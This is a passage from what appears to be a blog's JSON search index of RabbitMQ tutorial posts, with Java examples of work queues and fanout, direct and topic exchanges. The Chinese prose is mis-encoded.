} } } public class Tut2Sender { private static Logger logger = LoggerFactory.getLogger(Tut2Sender.class); @Autowired private RabbitTemplate rabbitTemplate; @Autowired private Queue queue; AtomicInteger dots = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); @Scheduled(fixedDelay = 1000,initialDelay = 500) public void send(){ StringBuilder builder = new StringBuilder(&quot;hello&quot;); if(dots.getAndIncrement() == 3){ dots.set(1); } for(int i = 0;i&lt;dots.get();i++){ builder.append(&quot;.&quot;); } builder.append(count.incrementAndGet()); String msg = builder.toString(); rabbitTemplate.convertAndSend(queue.getName(),msg); logger.info(&quot;[x] sent {}&quot;,msg); } } @Profile({&quot;tut2&quot;,&quot;work-queues&quot;}) @Configuration public class Tut2Config { @Bean public Queue hello(){ return new Queue(&quot;tut.hello&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ @Bean public Tut2Receiver receiver1(){ return new Tut2Receiver(1); } @Bean public Tut2Receiver receiver2(){ return new Tut2Receiver(2); } } @Profile(&quot;sender&quot;) @Bean public Tut2Sender sender(){ return new Tut2Sender(); } }pub-sub@Configuration @Profile({&quot;tut3&quot;,&quot;pub-sub&quot;,&quot;publish-subscribe&quot;}) public class Tut3Config { @Bean public FanoutExchange fanout(){ return new FanoutExchange(&quot;tut.fanout&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ @Bean public Queue autoDeleteQueue1(){ return new AnonymousQueue(); } @Bean public Queue autoDeleteQueue2(){ return new AnonymousQueue(); } // è¿™ä¸ªåœ°æ–¹å¯èƒ½æ³¨å†Œä¸æˆåŠŸ @Bean public Binding binding1(FanoutExchange fanout,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(fanout); } @Bean public Binding binding2(FanoutExchange fanout,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(fanout); } @Bean public Tut3Receiver receiver(){ return new Tut3Receiver(); } } @Profile(&quot;sender&quot;) @Bean public Tut3Sender sender(){ return new Tut3Sender(); } } public class Tut3Receiver { @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;) public void receive1(String in) throws InterruptedException{ receive(in,1); } @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;) public void receive2(String in) throws InterruptedException{ receive(in,2); } public void receive(String in,int receiver) throws InterruptedException{ StopWatch watch = new StopWatch(); watch.start(); System.out.println(&quot;instance &quot; + receiver + &quot;[x] Received&quot; + in); doWork(in); watch.stop(); System.out.println(&quot;instance&quot; + receiver + &quot;[x] Done in&quot; + watch.getTotalTimeSeconds()+&quot;s&quot;); } private void doWork(String in) throws InterruptedException{ for(char ch: in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } } } } public class Tut3Sender { @Autowired private RabbitTemplate rabbitTemplate; @Autowired private FanoutExchange fanout; AtomicInteger dots = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); @Scheduled(fixedDelay = 1000,initialDelay = 500) public void send(){ StringBuilder builder = new StringBuilder(&quot;hello&quot;); if(dots.getAndIncrement() == 3){ dots.set(1); } for(int i = 0;i &lt; dots.get();i++){ builder.append(&quot;.&quot;); } builder.append(count.incrementAndGet()); String message = builder.toString(); rabbitTemplate.convertAndSend(fanout.getName(),&quot;&quot;,message); System.out.println(&quot;[x] sent&quot; +message); } }direct@Profile({&quot;tut4&quot;,&quot;routing&quot;}) @Configuration public class Tut4Config { // è®¾ç½®exchange @Bean public DirectExchange direct(){ return new DirectExchange(&quot;tut.direct&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ // åˆ›å»ºä¸¤ä¸ªåŒ¿åQueue an anonymous, non-durable, exclusive, auto-delete queue @Bean public Queue autoDeleteQueue1(){ return new AnonymousQueue(); } @Bean public Queue autoDeleteQueue2(){ return new AnonymousQueue(); } // ç»‘å®šç›¸å…³æ•°æ® @Bean public Binding binding1a(DirectExchange directExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(directExchange).with(&quot;orange&quot;); } @Bean public Binding binding1b(DirectExchange directExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(directExchange).with(&quot;black&quot;); } @Bean public Binding binding2a(DirectExchange directExchange,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(directExchange).with(&quot;green&quot;); } @Bean public Binding binding2b(DirectExchange direct,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(direct).with(&quot;black&quot;); } // @Bean public Tut4Receiver receiver(){ return new Tut4Receiver(); } } @Profile(&quot;sender&quot;) @Bean public Tut4Sender sender(){ return new Tut4Sender(); } } public class Tut4Receiver { @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;) public void receive1(String in) throws InterruptedException{ receive(in,1); } @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;) public void receive2(String in) throws InterruptedException{ receive(in,2); } public void receive(String in,int receiver) throws InterruptedException{ StopWatch watch = new StopWatch(); watch.start(); System.out.println(&quot;instance &quot; + receiver+&quot;[x] received &apos; &quot; + in+ &quot;&apos;&quot;); doWork(in); watch.stop(); System.out.println(&quot;instance &quot;+ receiver+&quot;[x] Done in&quot; + watch.getTotalTimeSeconds()+&quot;s&quot;); } private void doWork(String in) throws InterruptedException{ for(char ch: in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } } } } public class Tut4Sender { @Autowired private RabbitTemplate rabbitTemplate; @Autowired private DirectExchange directExchange; AtomicInteger index = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); private final String[] keys = {&quot;orange&quot;, &quot;black&quot;, &quot;green&quot;}; @Scheduled(fixedDelay = 1000, initialDelay = 500) public void send() { StringBuilder builder = new StringBuilder(&quot;Hello to &quot;); if (this.index.incrementAndGet() == 3) { this.index.set(0); } String key = keys[this.index.get()]; builder.append(key).append(&apos; &apos;); builder.append(this.count.incrementAndGet()); String message = builder.toString(); rabbitTemplate.convertAndSend(directExchange.getName(), key, message); System.out.println(&quot;[X] sent &apos;&quot; + message + &quot;&apos;&quot;); } }topic@Profile({&quot;tut5&quot;,&quot;topics&quot;}) @Configuration public class Tut5Config { @Bean public TopicExchange topicExchange(){ return new TopicExchange(&quot;tut.topic&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ @Bean public Tut5Receiver receiver(){ return new Tut5Receiver(); } @Bean public Queue autoDeleteQueue1(){ return new AnonymousQueue(); } @Bean public Queue autoDeleteQueue2(){ return new AnonymousQueue(); } @Bean public Binding binding1a(TopicExchange topicExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(topicExchange).with(&quot;*.orange.*&quot;); } @Bean public Binding binding1b(TopicExchange topicExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(topicExchange).with(&quot;*.*.rabbit&quot;); } @Bean public Binding binding2a(TopicExchange topic,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(topic).with(&quot;lazy.#&quot;); } } @Profile(&quot;sender&quot;) @Bean public Tut5Sender sender(){ return new Tut5Sender(); } } public class Tut5Receiver { @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;) public void receive1(String in) throws InterruptedException { receive(in, 1); } @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;) public void receive2(String in) throws InterruptedException { receive(in, 2); } public void receive(String in, int receiver) throws InterruptedException { StopWatch watch = new StopWatch(); watch.start(); System.out.println(&quot;instance &quot; + receiver + &quot; [X] received &apos; &quot; + in + &quot; &apos;&quot;); doWork(in); watch.stop(); System.out.println(&quot;instance &quot; + receiver + &quot; [X] Done in&quot; + watch.getTotalTimeSeconds() +&quot;s&quot;); } private void doWork(String in) throws InterruptedException{ for(char ch : in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } } } } public class Tut5Sender { @Autowired private RabbitTemplate rabbitTemplate; @Autowired private TopicExchange topicExchange; AtomicInteger index = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); private final String[] keys = {&quot;quick.orange.rabbit&quot;, &quot;lazy.orange.elephant&quot;, &quot;quick.orange.fox&quot;, &quot;lazy.brown.fox&quot;, &quot;lazy.pink.rabbit&quot;, &quot;quick.brown.fox&quot;}; @Scheduled(fixedDelay = 1000,initialDelay = 500) public void send(){ StringBuilder builder = new StringBuilder(&quot;Hello to &quot;); if(this.index.incrementAndGet() == keys.length){ this.index.set(0); } String key = keys[this.index.get()]; builder.append(key).append(&quot; &quot;); builder.append(this.count.incrementAndGet()); String message = builder.toString(); rabbitTemplate.convertAndSend(topicExchange.getName(),key,message); } }","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-topic","slug":"RabbitMQ-topic","date":"2020-03-13T06:01:21.000Z","updated":"2020-11-14T17:10:44.401Z","comments":true,"path":"2020/03/13/RabbitMQ-topic/","link":"","permalink":"http://yoursite.com/2020/03/13/RabbitMQ-topic/","excerpt":"","text":"Topicåœ¨ä¹‹å‰çš„ä¸€ç¯‡æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ”¹è¿›äº†æ—¥å¿—ç³»ç»Ÿã€‚æˆ‘ä»¬ä½¿ç”¨ direct ç›´æ¥å¹¿æ’­ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ fanout ,ä»è€Œè·å¾—äº†é€‰æ‹©æ€§æ¥æ”¶æ—¥å¿—çš„å¯èƒ½æ€§ã€‚ è™½ç„¶ä½¿ç”¨ direct exchange æ”¹è¿›äº†æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œä½†å®ƒä»»ç„¶æœ‰å±€é™æ€§â€“å®ƒä¸èƒ½åŸºäºå¤šä¸ªæ ‡å‡†è¿›è¡Œè·¯ç”±ã€‚ Topic exchangeæ¶ˆæ¯å‘é€åˆ° topic exchange ä¸èƒ½æ˜¯ä¸€ä¸ªéšæ„çš„ routing-key ã€‚å®ƒå¿…é¡»æ˜¯ä¸€ä¸ªç”± . åˆ†å‰²å•çº¯åˆ—è¡¨ã€‚ ä¾‹å¦‚ stock.usd.nyse ã€ nyse.vmw ã€ quick.orange.rabbit ç­‰ã€‚ routing- key å¯ä»¥æœ‰å°½å¯èƒ½å¤šï¼Œä½†æ˜¯æœ€å¤š255å­—èŠ‚ã€‚ ç»‘å®šé”®å¿…é¡»é‡‡ç”¨ç›¸åŒçš„å½¢å¼ã€‚ topic exchange å’Œ direct exchange ç±»ä¼¼-ä½¿ç”¨ç‰¹å®š routig keyå‘é€çš„æ¶ˆæ¯ä¼šè¢«ä¼ é€’åˆ°åŒ¹é… binding key çš„é˜Ÿåˆ—é‡Œé¢ã€‚ä½†æ˜¯ï¼Œå¯¹äº routing key æœ‰ä¸¤ä¸ªç‰¹æ®Šæƒ…å†µ * (starï¼‰å¯ä»¥æ›¿ä»£ä¸€ä¸ªå•è¯ # (hash) å¯ä»¥ä»£æ›¿0ä¸ªæˆ–å¤šä¸ªå•è¯ Topic exchangeTopic exchangeæ˜¯éå¸¸å‰å®³çš„å¹¶ä¸”å¯ä»¥è¡¨ç°å’Œå…¶ä»–exchangeä¸€æ ·çš„ å½“ä¸€ä¸ªé˜Ÿåˆ—æ˜¯ç”¨ # ç»‘å®šï¼Œé‚£ä¹ˆå°±ä¼šæ¥å—åˆ°æ‰€æœ‰ä¿¡æ¯ï¼Œä¸ç®¡routing-keyæ˜¯ä»€ä¹ˆï¼Œå°±åƒfanout å½“ç»‘å®šä¸­ä¸ä½¿ç”¨ * å’Œ # ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œtopic exchangeå°±ä¼šåƒdirect exchange Sender.javapublic class Send { private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;; public static void main(String[] args) throws IOException, TimeoutException { // åˆ›å»ºè¿æ¥ Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); //å£°æ˜exchange channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC); // æ¶ˆæ¯å†…å®¹ String msg = &quot;hello world!&quot;; channel.basicPublish(EXCHANGE_NAME,&quot;routekey1.1&quot;,null,msg.getBytes()); channel.close(); connection.close(); } }Rece1.javapublic class Rece1 { private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // String queueName = channel.queueDeclare().getQueue(); // // å£°æ˜é˜Ÿåˆ— // channel.queueDeclare(queueName,false,false,false,null); //ç»‘å®šé˜Ÿåˆ—åˆ°äº¤æ¢æœºä¸Š channel.queueBind(queueName,EXCHANGE_NAME,&quot;routekey.*&quot;); //åŒä¸€æ—¶åˆ»æœåŠ¡å™¨åªå‘é€ä¸€æ¡æ¶ˆæ¯ channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 :&quot; + msg); try { TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(queueName,false,consumer); } }Rece2.javapublic class Rece2 { private final static String QUEUE_NAME = &quot;test_queue_topic_work_2&quot;; private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // å£°æ˜é˜Ÿåˆ— channel.queueDeclare(QUEUE_NAME,false,false,false,null); //ç»‘å®šé˜Ÿåˆ—åˆ°äº¤æ¢æœºä¸Š channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;*.*&quot;); //åŒä¸€æ—¶åˆ»æœåŠ¡å™¨åªå‘é€ä¸€æ¡æ¶ˆæ¯ channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 :&quot; + msg); try { TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(QUEUE_NAME,false,consumer); } }","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-routing","slug":"RabbitMQ-routing","date":"2020-03-11T06:58:19.000Z","updated":"2020-11-14T17:10:45.278Z","comments":true,"path":"2020/03/11/RabbitMQ-routing/","link":"","permalink":"http://yoursite.com/2020/03/11/RabbitMQ-routing/","excerpt":"","text":"routingåœ¨ä¹‹å‰çš„å¯¼èˆªä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç®€å•æ—¥å¿—ç³»ç»Ÿï¼Œæˆ‘ä»¬èƒ½å¤Ÿå°†æ—¥å¿—ä¿¡æ¯å¹¿æ’­åˆ°å¾ˆå¤šæ¥å—è€…ã€‚ åœ¨æœ¬ç¯‡å¯¼èˆªä¸­ï¼Œæˆ‘ä»¬å°†ä¸ºå…¶æ·»åŠ ä¸€ä¸ªç‰¹æ€§-æˆ‘ä»¬å°†ä½¿è®¢é˜…æ¶ˆæ¯çš„ä¸€ä¸ªå­é›†æˆä¸ºå¯èƒ½ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå°†é”™è¯¯ä¿¡æ¯å®šå‘å†™å…¥é”™è¯¯æ—¥å¿—æ–‡ä»¶ï¼ŒåŒæ—¶èƒ½å¤Ÿåœ¨æ§åˆ¶å°æ‰“å°æ‰€æœ‰ä¿¡æ¯ã€‚ bindingåœ¨ä¹‹å‰çš„ä¾‹å­ä¸­æˆ‘ä»¬èƒ½å¤Ÿåˆ›å»ºç»‘å®šï¼Œä½ å¯èƒ½ä¼šå›æƒ³èµ·è¿™æ ·çš„ä»£ç  channel.queueBind(queueName, EXCHANGE_NAME, &quot;&quot;);ç»‘å®šæ˜¯äº¤æ¢å’Œé˜Ÿåˆ—ä¹‹é—´çš„å…³ç³»ã€‚è¿™å¯ä»¥ç®€å•åœ°ç†è§£ï¼šé˜Ÿåˆ—å¯¹æ¥è‡ªè¿™ä¸ªäº¤æ¢çš„æ¶ˆæ¯æ„Ÿå…´è¶£ã€‚ ç»‘å®šå¯ä»¥ä½¿ç”¨é¢å¤–çš„routingKeyå‚æ•°ã€‚ä¸ºäº†é¿å…ä¸åŸºæœ¬çš„å‘å¸ƒå‚æ•°æ··æ·†ï¼Œæˆ‘ä»¬å°†å…¶ç§°ä¸ºç»‘å®šé”®ã€‚è¿™å°±æ˜¯æˆ‘ä»¬å¦‚ä½•é”®åˆ›å»ºç»‘å®šçš„æ–¹æ³•ã€‚ channel.queueBind(queueName, EXCHANGE_NAME, &quot;black&quot;);ç»‘å®šé”®çš„æ„ä¹‰å–å†³äºäº¤æ¢ç±»å‹ã€‚æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„ fanout äº¤æ¢æœºå®Œå…¨å¿½ç•¥äº†å®ƒçš„ä»·å€¼ã€‚ Direct exchangeæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„ fanout exchange,è¿™å¹¶æ²¡æœ‰ç»™æˆ‘ä»¬å¤šå¤§çš„çµæ´»æ€§â€”â€”å®ƒåªèƒ½è¿›è¡Œä¸éœ€è¦åŠ¨è„‘ç­‹çš„å¹¿æ’­ã€‚æˆ‘ä»¬å°†ç”¨ directexchange.æ¶ˆæ¯å¯ä»¥ä¼ é€’åˆ°å…¶ç»‘å®šé”® bindingKey ä¸æ¶ˆæ¯çš„è·¯ç”±é”® routingkey å®Œå…¨åŒ¹é…çš„é˜Ÿåˆ— ![directå½¢å¼exchange](http://qjrzrivoh.hd-bkt.clouddn.com/1605373844.89553489789.png) æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œé¢errorå¯ä»¥å‘é€åˆ° amqp.gen-S9b... å’Œ amqp.gen-Ag1...é˜Ÿåˆ—ä¸­,è€Œinfoå’Œwaringåªèƒ½å‘é€åˆ° amqp.gen-Ag1... é˜Ÿåˆ—ä¸­ Send.java public class Send { private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); // åˆ›å»ºchannle Channel channel = connection.createChannel(); // å£°æ˜exchange channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.DIRECT); String msg = &quot;hello exchange direct&quot;; String routingKey = &quot;error&quot;; channel.basicPublish(EXCHANGE_NAME, routingKey, null, msg.getBytes()); channel.close(); connection.close(); } }Rece1.java public class Rece1 { private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;; private static final String QUEUE_NAME = &quot;test_queue_direct1&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;error&quot;); channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 recieve msg :&quot; + msg); try{ TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(QUEUE_NAME,false,consumer); } }Rece2.java public class Rece1 { private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;; private static final String QUEUE_NAME = &quot;test_queue_direct1&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;error&quot;); channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 recieve msg :&quot; + msg); try{ TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(QUEUE_NAME,false,consumer); } }å¶å°”æŠ¥é”™é˜Ÿåˆ—ç»‘å®šäº¤æ¢æœºæ—¶ï¼ŒroutingKeyæ˜¯å…·æœ‰ç¼“å­˜æœºåˆ¶çš„ã€‚æˆ‘åœ¨å†™ä»£ç çš„æ—¶å€™ï¼Œè¯¯æ“ä½œäº†å°†é˜Ÿåˆ—éƒ½ç»‘å®šäº† error ï¼Œ info , warning .æˆ‘å‘ç°æ— æ³•å®ç°ä¸Šè¿°çš„æ•ˆæœï¼Œæ”¹äº†ä»£ç ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•è§£å†³ã€‚æœ€åç™»å½•äº†RabbitMQæŸ¥çœ‹ç›¸å…³ç»‘å®šã€‚å¹¶ä½¿ç”¨çš„unbindåŠŸèƒ½ã€‚ [å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-B8DH8bJF-1583909785873)(https://s2.ax1x.com/2020/03/11/8AFtBT.md.png)]","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-å‘å¸ƒè®¢é˜…","slug":"RabbitMQ-å‘å¸ƒè®¢é˜…","date":"2020-03-09T10:35:29.000Z","updated":"2020-11-14T17:10:46.418Z","comments":true,"path":"2020/03/09/RabbitMQ-å‘å¸ƒè®¢é˜…/","link":"","permalink":"http://yoursite.com/2020/03/09/RabbitMQ-%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/","excerpt":"","text":"å‘å¸ƒä¸è®¢é˜…åœ¨ä¸Šä¸€ä¸ªæ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå·¥ä½œé˜Ÿåˆ—ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªäººç‰©ï¼Œæœ€ç»ˆæ°å¥½åˆ†é…åˆ°ä¸€ä¸ªå·¥äººã€‚ç„¶è€Œï¼Œåœ¨è¿™ä¸ªéƒ¨åˆ†ï¼Œæˆ‘ä»¬å¸Œæœ›æ¯ä¸ªæ¶ˆæ¯èƒ½åˆ†é…ç»™å¤šä¸ªæ¶ˆè´¹è€…ã€‚è¿™ç§å«å‘å¸ƒè®¢é˜…æ¨¡å¼ã€‚ä¸¾ä¾‹ï¼Œæ³¨å†Œæ—¶éœ€è¦åŒæ—¶å‘é€çŸ­ä¿¡å’Œå‘é€email,æˆ‘ä»¬ä¼šå°†ç”¨æˆ·æ³¨å†Œçš„ä¿¡æ¯å‘ç»™ä¸¤ä¸ªæ¶ˆè´¹è€…ï¼Œä¸€ä¸ªä¸“é—¨å‘é€çŸ­ä¿¡æ¶ˆè´¹è€…ï¼Œä¸€ä¸ªä¸“é—¨å‘é€emailæ¶ˆè´¹è€…ã€‚ RabbitMQæ¶ˆæ¯ä¼ é€’æ¨¡å‹çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œç”Ÿäº§è€…ä¸ç›´æ¥æƒ³æ¶ˆæ¯é˜Ÿåˆ—å‘é€ä¿¡æ¯ã€‚å®é™…ä¸Šï¼Œç”Ÿäº§è€…å¹¶ä¸çŸ¥é“æ¶ˆæ¯æ˜¯å¦ä¼šè¢«ä¼ é€’åˆ°ä»»ä½•é˜Ÿåˆ—ä¸Šã€‚ äº¤æ¢æœºè¿™é‡Œå°±è®²åˆ°ä¸€ä¸ªæ–°å‹æ¦‚å¿µï¼Œäº¤æ¢æœºï¼ˆexchangeï¼‰,ä¸€æ–¹é¢æ¥æ”¶ç”Ÿäº§è€…çš„ä¿¡æ¯ï¼Œä¸€æ–¹é¢æ¨é€ç»™é˜Ÿåˆ—ã€‚äº¤æ¢å™¨å¿…é¡»ç¡®åˆ‡åœ°çŸ¥é“å¦‚ä½•å¤„ç†å®ƒæ¥æ”¶åˆ°çš„æ¶ˆæ¯ã€‚å®ƒåº”è¯¥è¢«é™„åŠ åˆ°ä¸€ä¸ªç‰¹å®šçš„é˜Ÿåˆ—å—?å®ƒåº”è¯¥è¢«æ·»åŠ åˆ°è®¸å¤šé˜Ÿåˆ—ä¸­å—?æˆ–è€…å®ƒåº”è¯¥è¢«ä¸¢å¼ƒã€‚è¿™äº›è§„åˆ™ç”±exchangeç±»å‹å®šä¹‰ã€‚æœ‰å‡ ç§å¯ç”¨çš„äº¤æ¢ç±»å‹:directã€topicã€headerså’Œfanoutã€‚ä¸‹é¢è®²ï¼šfanoutï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ç±»å‹ã€‚åªæ˜¯å°†æ¶ˆæ¯å¹¿æ’­åˆ°å®ƒçŸ¥é“çš„æ‰€æœ‰é˜Ÿåˆ—ä¸­å»ã€‚ä¸‹å›¾ä¸­Xå°±æ˜¯äº¤æ¢æœºã€‚ ç”Ÿäº§è€…public class Send { private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection() ; Channel channel = connection.createChannel(); // å£°æ˜é˜Ÿåˆ— channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT);//åˆ†å‘ç±»å‹fanout String msg = &quot;hello world ps&quot;; // å‘é€ä¿¡æ¯ channel.basicPublish(EXCHANGE_NAME,&quot;&quot;,null,msg.getBytes()); System.out.println(&quot;send success&quot;); // å…³é—­æµ channel.close(); connection.close(); } }æ¶ˆè´¹è€…public class Rece1 { private final static String QUEUE_NAME = &quot;test_queu_email&quot;; private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // ç»‘å®šé˜Ÿåˆ— channel.queueDeclare(QUEUE_NAME, false, false, false, null); // ç»‘å®šé˜Ÿåˆ—åˆ°äº¤æ¢æœºä¸Š channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;&quot;); //qos=1 channel.basicQos(1); DefaultConsumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { System.out.println(&quot;send email &quot; + new String(body, Charset.defaultCharset())); channel.basicAck(envelope.getDeliveryTag(), false); } }; boolean autoAck = false; channel.basicConsume(QUEUE_NAME, autoAck, consumer); } } public class Rece2 { private final static String QUEUE_NAME = &quot;test_queu_msg&quot;; private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // ç»‘å®šé˜Ÿåˆ— channel.queueDeclare(QUEUE_NAME, false, false, false, null); // ç»‘å®šé˜Ÿåˆ—åˆ°äº¤æ¢æœºä¸Š channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;&quot;); //qos=1 channel.basicQos(1); DefaultConsumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { System.out.println(&quot;send msg &quot; + new String(body, Charset.defaultCharset())); channel.basicAck(envelope.getDeliveryTag(), false); } }; boolean autoAck = false; channel.basicConsume(QUEUE_NAME, autoAck, consumer); } }å®˜æ–¹æ¨èçš„queue_nameå®˜æ–¹å¸Œæœ›èƒ½å¤Ÿå®ç°ï¼Œç”Ÿæˆå”¯ä¸€åç§°queue_name,å¹¶ä¸”ä¸€æ—¦æ–­å¼€ç”Ÿäº§è€…è¿æ¥ï¼Œé˜Ÿåˆ—è‡ªåŠ¨åˆ é™¤ã€‚ String queueName = 